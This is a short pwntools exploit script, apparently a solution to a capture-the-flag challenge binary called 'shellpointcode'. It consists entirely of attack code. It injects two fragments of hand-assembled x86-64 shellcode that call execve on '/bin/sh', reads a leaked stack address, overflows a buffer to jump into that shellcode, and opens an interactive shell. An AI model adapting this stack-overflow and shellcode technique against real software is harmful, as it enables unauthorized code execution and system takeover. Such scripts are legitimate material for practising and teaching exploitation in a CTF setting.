from pwn import *

context.arch = "amd64"
r = gdb.debug('./shellpointcode')

sh1 = ''
sh1 += asm('mov rbx, 0x68732f6e69622f2f')
#sh1 += asm('int3')
sh1 += asm('pop rdx')
sh1 += asm('jmp rsp')

sh2 = ''
sh2 += asm('xor rsi, rsi')
sh2 += asm('xor rdx, rdx')
sh2 += asm('mov al, 0x3b')
sh2 += asm('push rdx')
sh2 += asm('push rbx')
sh2 += asm('mov rdi, rsp')
sh2 += asm('syscall')

r.recvuntil(':')
r.sendline(sh1)

r.recvuntil(':')
r.sendline(sh2)

r.recvuntil(':')
r.recvuntil('.next: ')

n = r.recvuntil('\n')
leak = int(n,16)
log.info('leak : 0x%x' % leak)

r.recvuntil('?\n')

r.sendline('a'*11 + p64(leak + 40))
r.interactive()